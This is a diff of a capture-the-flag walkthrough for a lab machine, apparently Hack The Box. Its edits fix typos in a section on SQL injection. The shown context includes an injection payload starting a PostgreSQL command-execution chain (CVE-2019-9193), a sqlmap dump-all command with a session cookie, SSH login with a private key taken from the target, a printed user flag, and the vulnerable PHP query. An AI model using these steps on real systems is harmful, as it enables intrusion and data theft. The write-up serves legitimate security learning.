@@ -153,7 +153,7 @@ By inserting a single `'`character into the search field and pressing enter, we 
 
 4) Executing Arbitrary Commands via SQL Injection in PostgreSQL
 
-    According to [this article](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5), all versions of PostgreSQL from 9.3, are vulnerable to this kind of arbitrary command execution (CVE-2019-9193
+    According to [this article](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5), all versions of PostgreSQL from 9.3, are vulnerable to this kind of arbitrary command execution (CVE-2019-9193)
     ```
     '; CREATE TABLE cmd_exec(cmd_output text); --
 
@@ -169,7 +169,7 @@ By inserting a single `'`character into the search field and pressing enter, we 
 
 We now have access to the server!
 
-Btw, this all could be have also been done automatically by using `sqlmap`, but for the sake of learning: keep doing it manually!
+Btw, this all could have also been done automatically by using `sqlmap`, but for the sake of learning: keep doing it manually!
 
 ```
 $ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=vmnafl0uct1r97s1k5bkpoiopg" --dump-all --tamper=space2comment
@@ -181,16 +181,16 @@ $ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=vmna
 
 ## Exploitation
 
-In the homedirectory of our current user (/var/lib/postgresql), we can find a file called `user.txt`. It contains the user flag for the machine: `139d3e5c3db18073d250ce0dccc43997`.
+In the home directory of our current user (/var/lib/postgresql), we can find a file called `user.txt`. It contains the user flag for the machine: `139d3e5c3db18073d250ce0dccc43997`.
 Furthermore, the directory also contains the the `.ssh` directory, in which the private and public SSH key of the user are located. We can use them to stablize our current connection.
 
 ```
-$ chmod 600 ssh_key
+$ chmod 600 ssh_key (private one)
 
 $ ssh -i postgres_sshkey postgres@10.10.10.46
 ```
 
-In the `/var/www/html` directory, we can also find the source code for the `dashboard.php`. Let's take a look on the SQL query, that was vulnerable.
+In the `/var/www/html` directory, we can also find the source code for the `dashboard.php`. Let's take a look at the vulnerable SQL query.
 
 ``` php
  $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
